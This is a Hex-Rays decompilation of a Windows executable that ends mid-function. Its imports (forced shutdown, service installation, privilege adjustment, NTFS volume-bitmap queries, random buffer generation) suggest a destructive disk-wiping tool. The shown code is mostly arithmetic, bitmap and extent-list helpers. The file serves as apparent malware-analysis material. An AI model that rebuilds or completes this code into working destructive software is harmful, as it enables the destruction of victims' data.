/* This file was generated by the Hex-Rays decompiler version 9.0.0.241217.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __stdcall sub_401000(unsigned __int64 a1, __int64 a2);
unsigned __int64 __stdcall sub_4010B0(__int64 a1, __int64 a2);
unsigned int __stdcall sub_4010F0(unsigned __int64 a1, __int64 a2);
unsigned __int64 __stdcall sub_401160(unsigned __int64 a1, __int64 a2);
int __fastcall sub_4011E0(int a1, unsigned int a2, unsigned __int64 a3, int a4);
int __fastcall sub_401370(int a1, unsigned int *a2, __int64 a3, unsigned int a4, unsigned int a5, __int64 a6);
BOOL __fastcall sub_401490(HANDLE hDevice, unsigned __int64 **a2, DWORD *a3);
_DWORD *__fastcall sub_401590(int a1, _DWORD *a2, unsigned __int64 a3, __int64 a4, int a5, SIZE_T dwBytes);
int __fastcall sub_401870(LPCWSTR lpFileName, int a2, int a3);
int __fastcall sub_401990(void *a1, int a2, __int64 a3, DWORD *a4);
PSTR __stdcall sub_401B80(void *a1, int a2, int a3, _DWORD *a4, __int64 a5);
int __stdcall sub_401D10(int a1, int a2, int a3, _DWORD *a4, unsigned __int64 a5);
int __fastcall sub_401D60(int a1, int a2, void (__stdcall *a3)(void *, char *, int, int, DWORD, LONG));
DWORD __stdcall sub_401FE0(LPCWSTR lpRootPathName, int a2);
int __stdcall sub_402290(char *lpString, int a2);
int __stdcall sub_402330(int a1, int a2); // weak
int __fastcall sub_4023C0(PCWSTR psz1, int a2);
DWORD __stdcall StartAddress(LPVOID lpThreadParameter); // idb
BOOL __thiscall sub_4027F0(_DWORD **this);
DWORD __stdcall sub_402870(_DWORD **lpThreadParameter);
int __stdcall sub_402890(PCWSTR psz1, _DWORD *a2, int a3);
int __stdcall sub_4028D0(PCWSTR psz1, int a2, int a3); // idb
int __stdcall sub_402920(PCWSTR pszFirst, _BYTE *a2, int a3);
int __stdcall sub_402970(PCWSTR pszFirst, _BYTE *a2, int a3);
int __thiscall sub_4029D0(void *this);
int __stdcall sub_402F30(PCWSTR pszFirst, int a2, int a3); // idb
int __thiscall sub_402FD0(HANDLE hObject, int a2); // idb
int __stdcall sub_403290(LPCWSTR lpFileName, _DWORD *a2, int a3);
DWORD __stdcall sub_403310(LPVOID lpThreadParameter); // idb
int __stdcall sub_403430(LPCWSTR lpString, _DWORD *a2);
DWORD __stdcall sub_4034D0(HANDLE *lpThreadParameter);
int __fastcall sub_403620(const unsigned __int16 *a1, int (__stdcall *a2)(char *, _WIN32_FIND_DATAW *, int), int (__stdcall *a3)(char *, _WIN32_FIND_DATAW *, int), int a4);
DWORD __fastcall sub_4038A0(void (__stdcall *a1)(WCHAR *, int), int a2);
BOOL __fastcall sub_403930(const WCHAR *a1, const WCHAR *a2);
DWORD __stdcall sub_403B40(DWORD *lpThreadParameter);
void __noreturn start(); // weak
int __fastcall sub_4040A0(int a1, wint_t *a2, unsigned int a3);
int __fastcall sub_404110(unsigned int *a1, unsigned int a2, unsigned int a3, int a4, _DWORD *a5);
void __fastcall sub_404180(size_t a1, int a2, int a3, int a4, int a5, int a6, unsigned int *a7, void (__stdcall *a8)(int, int));
_DWORD *__cdecl sub_4044E0(int a1, int a2, int a3, int a4, void (__stdcall *a5)(int, int));
// char __usercall sub_4045D0@<al>(int a1@<edx>, int a2, char a3, void (__stdcall *a4)(int, int));
unsigned int *__stdcall sub_4047D0(unsigned int *a1, _DWORD *a2);
unsigned int __stdcall sub_404920(int a1, int a2);
char *__stdcall sub_4049F0(char *a1, _DWORD *a2);
BOOL __fastcall sub_404BE0(PCWSTR pszStart, int a2, int a3);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// void *__cdecl memset(void *, int Val, size_t Size);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *InitiateSystemShutdownExW)(LPWSTR lpMachineName, LPWSTR lpMessage, DWORD dwTimeout, BOOL bForceAppsClosed, BOOL bRebootAfterShutdown, DWORD dwReason);
// extern BOOL (__stdcall *ControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern BOOL (__stdcall *DeleteService)(SC_HANDLE hService);
// extern BOOL (__stdcall *StartServiceW)(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCWSTR *lpServiceArgVectors);
// extern BOOL (__stdcall *ChangeServiceConfigW)(SC_HANDLE hService, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCWSTR lpBinaryPathName, LPCWSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCWSTR lpDependencies, LPCWSTR lpServiceStartName, LPCWSTR lpPassword, LPCWSTR lpDisplayName);
// extern BOOL (__stdcall *QueryServiceStatus)(SC_HANDLE hService, LPSERVICE_STATUS lpServiceStatus);
// extern SC_HANDLE (__stdcall *CreateServiceW)(SC_HANDLE hSCManager, LPCWSTR lpServiceName, LPCWSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCWSTR lpBinaryPathName, LPCWSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCWSTR lpDependencies, LPCWSTR lpServiceStartName, LPCWSTR lpPassword);
// extern SC_HANDLE (__stdcall *OpenServiceW)(SC_HANDLE hSCManager, LPCWSTR lpServiceName, DWORD dwDesiredAccess);
// extern SC_HANDLE (__stdcall *OpenSCManagerW)(LPCWSTR lpMachineName, LPCWSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// extern BOOL (__stdcall *LookupPrivilegeValueW)(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern LSTATUS (__stdcall *RegDeleteKeyW)(HKEY hKey, LPCWSTR lpSubKey);
// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern BOOL (__stdcall *CryptAcquireContextW)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern LSTATUS (__stdcall *RegQueryInfoKeyW)(HKEY hKey, LPWSTR lpClass, LPDWORD lpcchClass, LPDWORD lpReserved, LPDWORD lpcSubKeys, LPDWORD lpcbMaxSubKeyLen, LPDWORD lpcbMaxClassLen, LPDWORD lpcValues, LPDWORD lpcbMaxValueNameLen, LPDWORD lpcbMaxValueLen, LPDWORD lpcbSecurityDescriptor, PFILETIME lpftLastWriteTime);
// extern LSTATUS (__stdcall *RegEnumKeyExW)(HKEY hKey, DWORD dwIndex, LPWSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPWSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime);
// extern LSTATUS (__stdcall *RegOpenKeyW)(HKEY hKey, LPCWSTR lpSubKey, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern LSTATUS (__stdcall *RegSetValueExW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern BOOL (__stdcall *DeviceIoControl)(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *GetLastError)();
// extern LPVOID (__stdcall *HeapReAlloc)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern int (__stdcall *lstrcmpA)(LPCSTR lpString1, LPCSTR lpString2);
// extern void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *GetDiskFreeSpaceW)(LPCWSTR lpRootPathName, LPDWORD lpSectorsPerCluster, LPDWORD lpBytesPerSector, LPDWORD lpNumberOfFreeClusters, LPDWORD lpTotalNumberOfClusters);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *FlushFileBuffers)(HANDLE hFile);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern ULONGLONG (__stdcall *VerSetConditionMask)(ULONGLONG ConditionMask, DWORD TypeMask, BYTE Condition);
// extern BOOL (__stdcall *VerifyVersionInfoW)(LPOSVERSIONINFOEXW lpVersionInformation, DWORD dwTypeMask, DWORDLONG dwlConditionMask);
// extern HRSRC (__stdcall *FindResourceW)(HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType);
// extern HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo);
// extern LPVOID (__stdcall *LockResource)(HGLOBAL hResData);
// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern UINT (__stdcall *GetSystemDirectoryW)(LPWSTR lpBuffer, UINT uSize);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern BOOL (__stdcall *SetThreadPriority)(HANDLE hThread, int nPriority);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern DWORD (__stdcall *GetLogicalDriveStringsW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern HANDLE (__stdcall *CreateEventW)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
// extern BOOL (__stdcall *SetEvent)(HANDLE hEvent);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern BOOL (__stdcall *GetFileInformationByHandle)(HANDLE hFile, LPBY_HANDLE_FILE_INFORMATION lpFileInformation);
// extern BOOL (__stdcall *DeleteFileW)(LPCWSTR lpFileName);
// extern void (__stdcall *LZClose)(INT hFile);
// extern LONG (__stdcall *LZCopy)(INT hfSource, INT hfDest);
// extern INT (__stdcall *LZOpenFileW)(LPWSTR lpFileName, LPOFSTRUCT lpReOpenBuf, WORD wStyle);
// extern LPWSTR *(__stdcall *CommandLineToArgvW)(LPCWSTR lpCmdLine, int *pNumArgs);
// extern PWSTR (__stdcall *StrStrW)(PCWSTR pszFirst, PCWSTR pszSrch);
// extern PWSTR (__stdcall *StrRChrW)(PCWSTR pszStart, PCWSTR pszEnd, WCHAR wMatch);
// extern PWSTR (__stdcall *StrChrW)(PCWSTR pszStart, WCHAR wMatch);
// extern int (__stdcall *StrToIntW)(PCWSTR pszSrc);
// extern BOOL (__stdcall *PathAddExtensionW)(LPWSTR pszPath, LPCWSTR pszExt);
// extern LPWSTR (__stdcall *PathFindExtensionW)(LPCWSTR pszPath);
// extern BOOL (__stdcall *PathFileExistsW)(LPCWSTR pszPath);
// extern PWSTR (__stdcall *StrCatBuffW)(PWSTR pszDest, PCWSTR pszSrc, int cchDestBuffSize);
// extern LPWSTR (__stdcall *PathAddBackslashW)(LPWSTR pszPath);
// extern BOOL (__stdcall *PathAppendW)(LPWSTR pszPath, LPCWSTR pszMore);
// extern PWSTR (__stdcall *StrStrIW)(PCWSTR pszFirst, PCWSTR pszSrch);
// extern int (__stdcall *StrCmpNW)(PCWSTR psz1, PCWSTR psz2, int nChar);
// extern int (*wnsprintfW)(PWSTR pszDest, int cchDest, PCWSTR pszFmt, ...);
// extern PSTR (__stdcall *StrStrA)(PCSTR pszFirst, PCSTR pszSrch);
// extern int (*wsprintfW)(LPWSTR, LPCWSTR, ...);
// extern LPWSTR (__stdcall *CharLowerW)(LPWSTR lpsz);
// extern wint_t (__cdecl *towupper)(wint_t C);
// extern wchar_t *(__cdecl *wcsncpy)(wchar_t *Destination, const wchar_t *Source, size_t Count);
unsigned __int16 word_405548[2] = { 46u, 0u }; // weak
__int128 xmmword_405860 = 0x5800450044004E00490024003A003ALL; // weak
__int128 xmmword_405870 = 0x5400410043004F004C004C0041005FLL; // weak
const WCHAR word_405888 = 58u; // idb
int dword_407008[] = { 32 }; // weak
wchar_t *Source = L"$ATTRIBUTE_LIST"; // idb
HMODULE hModule; // idb


//----- (00401000) --------------------------------------------------------
int __stdcall sub_401000(unsigned __int64 a1, __int64 a2)
{
  int v2; // edi
  int v3; // eax
  unsigned __int64 v4; // rtt
  __int64 v5; // rax
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rax
  unsigned int v8; // esi
  unsigned __int64 v9; // rax

  v2 = 0;
  if ( (a1 & 0x8000000000000000uLL) != 0LL )
  {
    v2 = 1;
    HIDWORD(a1) = -HIDWORD(a1) - ((_DWORD)a1 != 0);
    LODWORD(a1) = -(int)a1;
  }
  v3 = HIDWORD(a2);
  if ( a2 < 0 )
  {
    ++v2;
    v3 = -HIDWORD(a2) - ((_DWORD)a2 != 0);
    HIDWORD(a2) = v3;
    LODWORD(a2) = -(int)a2;
  }
  if ( v3 )
  {
    v6 = __PAIR64__(v3, a2);
    v7 = a1;
    do
    {
      v6 >>= 1;
      v7 >>= 1;
    }
    while ( HIDWORD(v6) );
    v8 = v7 / (unsigned int)v6;
    v9 = v8 * (unsigned __int64)(unsigned int)a2;
    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * (unsigned __int64)v8) >> 32, v9 > a1) )
      --v8;
    v5 = v8;
  }
  else
  {
    LODWORD(v4) = a1;
    HIDWORD(v4) = HIDWORD(a1) % (unsigned int)a2;
    LODWORD(v5) = v4 / (unsigned int)a2;
    HIDWORD(v5) = HIDWORD(a1) / (unsigned int)a2;
  }
  if ( v2 == 1 )
    return -v5;
  return v5;
}

//----- (004010B0) --------------------------------------------------------
unsigned __int64 __stdcall sub_4010B0(__int64 a1, __int64 a2)
{
  if ( HIDWORD(a1) | HIDWORD(a2) )
    return a1 * a2;
  else
    return (unsigned int)a2 * (unsigned __int64)(unsigned int)a1;
}

//----- (004010F0) --------------------------------------------------------
unsigned int __stdcall sub_4010F0(unsigned __int64 a1, __int64 a2)
{
  unsigned __int64 v3; // rtt
  unsigned int v4; // ecx
  unsigned int v5; // ebx
  unsigned __int64 v6; // rax
  char v7; // cf
  unsigned int v8; // esi
  unsigned __int64 v9; // rax

  if ( HIDWORD(a2) )
  {
    v4 = HIDWORD(a2);
    v5 = a2;
    v6 = a1;
    do
    {
      v7 = v4 & 1;
      v4 >>= 1;
      v5 = (v5 >> 1) | (v7 << 31);
      v6 >>= 1;
    }
    while ( v4 );
    v8 = v6 / v5;
    v9 = v8 * (unsigned __int64)(unsigned int)a2;
    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * (unsigned __int64)v8) >> 32, v9 > a1) )
      --v8;
    return v8;
  }
  else
  {
    LODWORD(v3) = a1;
    HIDWORD(v3) = HIDWORD(a1) % (unsigned int)a2;
    return v3 / (unsigned int)a2;
  }
}

//----- (00401160) --------------------------------------------------------
unsigned __int64 __stdcall sub_401160(unsigned __int64 a1, __int64 a2)
{
  unsigned __int64 v2; // rtt
  unsigned int v4; // ecx
  unsigned int v5; // ebx
  unsigned __int64 v6; // rax
  bool v7; // cf
  int v8; // ecx
  unsigned __int64 v9; // rax

  if ( HIDWORD(a2) )
  {
    v4 = HIDWORD(a2);
    v5 = a2;
    v6 = a1;
    do
    {
      v7 = v4 & 1;
      v4 >>= 1;
      v5 = (v5 >> 1) | (v7 << 31);
      v6 >>= 1;
    }
    while ( v4 );
    v8 = HIDWORD(a2) * (v6 / v5);
    v9 = (unsigned int)a2 * (unsigned __int64)(unsigned int)(v6 / v5);
    v7 = __CFADD__(v8, HIDWORD(v9));
    HIDWORD(v9) += v8;
    if ( v7 || v9 > a1 )
      v9 -= a2;
    return a1 - v9;
  }
  else
  {
    LODWORD(v2) = a1;
    HIDWORD(v2) = HIDWORD(a1) % (unsigned int)a2;
    return v2 % (unsigned int)a2;
  }
}

//----- (004011E0) --------------------------------------------------------
int __fastcall sub_4011E0(int a1, unsigned int a2, unsigned __int64 a3, int a4)
{
  unsigned __int64 v4; // kr00_8
  __int64 v5; // kr08_8
  __int64 v6; // rcx
  unsigned int v7; // edx
  unsigned int v8; // edx
  int v9; // edi
  bool v10; // cf
  unsigned int v11; // edi
  unsigned int v12; // ecx
  int result; // eax
  int v14; // eax
  int v15; // esi
  unsigned int v16; // [esp+28h] [ebp-34h]
  __int64 v17; // [esp+34h] [ebp-28h]

  HIDWORD(v17) = a3 >> 5;
  LODWORD(v17) = HIDWORD(a3) >> 5;
  v4 = a2 + a3 - 1;
  v16 = v4 >> 5;
  v5 = 7 - (a3 & 7);
  HIDWORD(v6) = ((_BYTE)a2 + (_BYTE)a3 - 1) & 7;
  v7 = 128;
  while ( v5 )
  {
    v7 = (v7 | 0x100) >> 1;
    --v5;
  }
  v8 = v7 | 0xFFFFFF00;
  v9 = 1;
  LODWORD(v6) = 0;
  while ( v6 )
  {
    v10 = HIDWORD(v6)-- != 0;
    LODWORD(v6) = v10 + (_DWORD)v6 - 1;
    v9 = (2 * v9) | 1;
  }
  v11 = (0xFFFFFFFF >> (32 - 8 * ((v4 >> 3) & 3))) | (v9 << (8 * ((v4 >> 3) & 3)));
  v12 = a3 >> 5;
  result = HIDWORD(v4) >> 5;
  if ( v17 == __PAIR64__(v4 >> 5, HIDWORD(v4) >> 5) )
    v8 = ~(v11 ^ v8);
  while ( result || v12 <= v16 )
  {
    if ( __PAIR64__(v12, 0) == v17 )
    {
      v14 = v8;
    }
    else if ( v12 != v16 || result )
    {
      v14 = -1;
    }
    else
    {
      v14 = v11;
    }
    v15 = *(_DWORD *)(a1 + 4 * v12);
    if ( a4 )
      *(_DWORD *)(a1 + 4 * v12) = v14 | v15;
    else
      *(_DWORD *)(a1 + 4 * v12) = v15 & ~v14;
    ++v12;
    result = HIDWORD(v4) >> 5;
  }
  return result;
}

//----- (00401370) --------------------------------------------------------
int __fastcall sub_401370(int a1, unsigned int *a2, __int64 a3, unsigned int a4, unsigned int a5, __int64 a6)
{
  unsigned int v6; // eax
  int v7; // ebx
  unsigned int v8; // esi
  bool v10; // cf
  bool i; // cc
  int v12; // ecx
  unsigned __int64 v13; // kr00_8
  unsigned __int64 v14; // kr08_8
  bool v15; // cf
  bool j; // cc
  int result; // eax

  v6 = a5;
  v7 = a1;
  v8 = a3 - a6;
  v10 = a5 < (unsigned __int64)(a3 - a6) >> 32;
  for ( i = a5 <= (unsigned __int64)(a3 - a6) >> 32; ; i = v6 <= (unsigned __int64)(a3 - a6) >> 32 )
  {
    if ( !i || !v10 && a4 >= v8 )
      return 0;
    if ( ((1 << (a4 & 0x1F)) & *(_DWORD *)(v7 + 4 * (__PAIR64__(v6, a4) >> 5))) == 0 )
      break;
LABEL_14:
    v6 = (__PAIR64__(v6, a4++) + 1) >> 32;
    v10 = v6 < (unsigned __int64)(a3 - a6) >> 32;
  }
  v12 = a1;
  if ( ((1 << ((a6 + a4 - 1) & 0x1F)) & *(_DWORD *)(a1 + 4 * ((a6 + __PAIR64__(v6, a4) - 1) >> 5))) != 0 )
  {
LABEL_13:
    v8 = a3 - a6;
    v7 = v12;
    goto LABEL_14;
  }
  v13 = __PAIR64__(v6, a4) + 1;
  v14 = a6 + __PAIR64__(v6, a4) - 2;
  v15 = (__PAIR64__(v6, a4) + 1) >> 32 < HIDWORD(v14);
  for ( j = (__PAIR64__(v6, a4) + 1) >> 32 <= HIDWORD(v14);
        j && (v15 || (unsigned int)v13 < (unsigned int)v14);
        j = ++v13 >> 32 <= HIDWORD(v14) )
  {
    v12 = a1;
    if ( ((1 << (v13 & 0x1F)) & *(_DWORD *)(a1 + 4 * (v13 >> 5))) != 0 )
      goto LABEL_13;
    v15 = (v13 + 1) >> 32 < HIDWORD(v14);
  }
  a2[1] = v6;
  result = 1;
  *a2 = a4;
  return result;
}

//----- (00401490) --------------------------------------------------------
BOOL __fastcall sub_401490(HANDLE hDevice, unsigned __int64 **a2, DWORD *a3)
{
  DWORD v3; // ebx
  unsigned __int64 *v4; // edi
  HANDLE ProcessHeap; // eax
  unsigned __int64 *v6; // eax
  BOOL v7; // esi
  DWORD LastError; // eax
  HANDLE v9; // eax
  unsigned __int64 *v10; // eax
  HANDLE v11; // eax
  __int64 InBuffer; // [esp+Ch] [ebp-1Ch] BYREF
  DWORD BytesReturned; // [esp+18h] [ebp-10h] BYREF
  unsigned __int64 **v15; // [esp+1Ch] [ebp-Ch]
  HANDLE hDevicea; // [esp+20h] [ebp-8h]

  v15 = a2;
  v3 = *a3;
  hDevicea = hDevice;
  InBuffer = 0LL;
  if ( v3 )
  {
    v4 = *a2;
  }
  else
  {
    v3 = 28;
    ProcessHeap = GetProcessHeap();
    v6 = (unsigned __int64 *)HeapAlloc(ProcessHeap, 8u, 0x1Cu);
    hDevice = hDevicea;
    v4 = v6;
  }
  v7 = 0;
  if ( !v4 )
    goto LABEL_10;
  v7 = DeviceIoControl(hDevice, 0x9006Fu, &InBuffer, 8u, v4, v3, &BytesReturned, 0);
  LastError = GetLastError();
  if ( v7 )
    goto LABEL_14;
  if ( LastError != 234 )
    goto LABEL_10;
  v3 = sub_401000(v4[1], 8LL) + 25;
  v9 = GetProcessHeap();
  v10 = (unsigned __int64 *)HeapReAlloc(v9, 0, v4, v3);
  if ( !v10 )
    goto LABEL_10;
  v4 = v10;
  v7 = DeviceIoControl(hDevicea, 0x9006Fu, &InBuffer, 8u, v10, v3, &BytesReturned, 0);
  if ( v7 )
  {
LABEL_14:
    if ( v7 )
    {
      *v15 = v4;
      *a3 = v3;
      return 1;
    }
  }
  else
  {
    GetLastError();
  }
LABEL_10:
  if ( !*v15 )
  {
    if ( v4 )
    {
      v11 = GetProcessHeap();
      HeapFree(v11, 0, v4);
    }
  }
  return v7;
}

//----- (00401590) --------------------------------------------------------
_DWORD *__fastcall sub_401590(int a1, _DWORD *a2, unsigned __int64 a3, __int64 a4, int a5, SIZE_T dwBytes)
{
  _DWORD **v8; // esi
  HANDLE v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // ecx
  int v12; // eax
  HANDLE v13; // eax
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  HANDLE v16; // eax
  _DWORD *result; // eax
  HANDLE v18; // eax
  DWORD v19; // ebx
  BYTE *v20; // edi
  _DWORD *v21; // edx
  unsigned int v22; // eax
  unsigned int v23; // edi
  unsigned int v24; // ebx
  unsigned __int64 v25; // kr08_8
  int v26; // eax
  HANDLE ProcessHeap; // eax
  _DWORD *v28; // eax
  unsigned int v29; // ebx
  unsigned int v30; // kr10_4
  unsigned int v31; // kr04_4
  __int64 v32; // kr18_8
  __int64 v33; // kr20_8
  bool v34; // cf
  _DWORD *v35; // ecx
  _DWORD *v36; // ecx
  SIZE_T v37; // [esp-4h] [ebp-2Ch]
  _FILETIME SystemTimeAsFileTime; // [esp+10h] [ebp-18h] BYREF
  __int64 v39; // [esp+18h] [ebp-10h]
  HCRYPTPROV phProv; // [esp+20h] [ebp-8h] BYREF
  unsigned int v41; // [esp+24h] [ebp-4h]

  v8 = *(_DWORD ***)a1;
  if ( *(_DWORD *)a1 )
  {
    if ( v8[3] == a2 )
    {
LABEL_25:
      v21 = v8[2];
      if ( !v21 )
      {
LABEL_41:
        ProcessHeap = GetProcessHeap();
        v28 = HeapAlloc(ProcessHeap, 0, 0x18u);
        v21 = v28;
        if ( v28 )
        {
          v35 = v8[2];
          if ( v35 )
          {
            v36 = (_DWORD *)v35[1];
            v8[2] = v28;
            v28[1] = v36;
            *v28 = *v36;
            *v36 = v28;
            *(_DWORD *)(*v28 + 4) = v28;
          }
          else
          {
            v8[2] = v28;
            *v28 = v28;
            v28[1] = v28;
          }
        }
        *((_QWORD *)v28 + 1) = a3;
        goto LABEL_51;
      }
      v41 = a4 + a3;
      phProv = (a4 + a3) >> 32;
      while ( 1 )
      {
        v22 = v21[4];
        v23 = v21[2];
        v24 = v21[3];
        HIDWORD(v39) = v21[5];
        LODWORD(v39) = v22;
        v25 = __PAIR64__(v24, v22) + __PAIR64__(HIDWORD(v39), v23);
        if ( __PAIR64__(phProv, v41) >= __PAIR64__(v24, v23) && __PAIR64__(phProv, v41) < v25 )
        {
          v30 = v23 - v41;
          v29 = (__PAIR64__(v24, v23) - __PAIR64__(phProv, v41)) >> 32;
          v31 = v39;
          v21[2] = a3;
          v32 = a4 + __PAIR64__(v29, v31) + __PAIR64__(HIDWORD(v39), v30);
          v21[3] = HIDWORD(a3);
          result = v21;
          *((_QWORD *)v21 + 2) = v32;
          return result;
        }
        if ( a3 > __PAIR64__(v24, v23) )
        {
          if ( __PAIR64__(phProv, v41) <= v25 )
            goto LABEL_35;
          if ( a3 <= v25 )
          {
            v33 = v39 - v25;
            v34 = __CFADD__(v41, v39 - v25);
            v21[4] = v41 + v39 - v25;
            result = v21;
            v21[5] = phProv + v34 + HIDWORD(v33);
            return result;
          }
        }
        if ( HIDWORD(v25) >= phProv )
        {
          if ( HIDWORD(v25) > phProv || (unsigned int)v25 >= v41 )
          {
LABEL_35:
            if ( __PAIR64__(v24, v23) <= a3 )
              return v21;
          }
          if ( v25 > __PAIR64__(phProv, v41) )
            goto LABEL_40;
        }
        if ( v24 > HIDWORD(a3) )
        {
          v26 = a3;
LABEL_46:
          v21[2] = v26;
          v21[3] = HIDWORD(a3);
LABEL_51:
          *((_QWORD *)v21 + 2) = a4;
          return v21;
        }
        if ( v24 >= HIDWORD(a3) )
        {
          v26 = a3;
          if ( v23 >= (unsigned int)a3 )
            goto LABEL_46;
        }
LABEL_40:
        v21 = (_DWORD *)*v21;
        if ( v21 == v8[2] )
          goto LABEL_41;
      }
    }
    while ( 1 )
    {
      v8 = (_DWORD **)*v8;
      if ( v8 == *(_DWORD ***)a1 )
        break;
      if ( v8[3] == a2 )
        goto LABEL_25;
    }
  }
  v9 = GetProcessHeap();
  v10 = HeapAlloc(v9, 0, 0x18u);
  v8 = (_DWORD **)v10;
  if ( v10 )
  {
    if ( *(_DWORD *)a1 )
    {
      v11 = *(_DWORD **)(*(_DWORD *)a1 + 4);
      *(_DWORD *)a1 = v10;
      v10[1] = v11;
      *v10 = *v11;
      *v11 = v10;
      *(_DWORD *)(*v10 + 4) = v10;
    }
    else
    {
      *(_DWORD *)a1 = v10;
      *v10 = v10;
      v10[1] = v10;
    }
  }
  v12 = dwBytes;
  v8[3] = a2;
  v8[2] = 0;
  if ( !dwBytes )
    v12 = 8 * a5;
  v37 = v12;
  v8[5] = (_DWORD *)v12;
  v13 = GetProcessHeap();
  v14 = HeapAlloc(v13, 0, v37);
  v8[4] = v14;
  if ( v14 )
  {
    SystemTimeAsFileTime = 0LL;
    GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
    v19 = (DWORD)v8[5];
    v20 = (BYTE *)v8[4];
    phProv = 0;
    if ( CryptAcquireContextW(&phProv, 0, 0, 1u, 0xF0000040) )
    {
      if ( !CryptGenRandom(phProv, v19, v20) && v19 )
      {
        do
        {
          *v20++ = 0;
          --v19;
        }
